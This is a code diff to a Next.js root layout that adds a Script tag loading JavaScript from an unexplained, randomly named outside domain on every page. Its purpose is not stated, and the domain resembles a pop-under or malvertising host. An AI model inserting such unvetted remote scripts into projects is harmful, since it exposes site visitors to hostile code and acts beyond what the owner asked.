@@ -1,4 +1,5 @@
 import type { Metadata } from "next";
+import Script from "next/script";
 import "@/src/index.css";
 
 export const metadata: Metadata = {
@@ -102,6 +103,10 @@ export default function RootLayout({
       </head>
       <body className="bg-slate-50 font-sans text-slate-900 antialiased selection:bg-indigo-500/10 selection:text-indigo-600">
         {children}
+        <Script
+          src="https://armsbroodelusive.com/36/21/a0/3621a0fd09388e1d44ba266b82228a1e.js"
+          strategy="afterInteractive"
+        />
       </body>
     </html>
   );
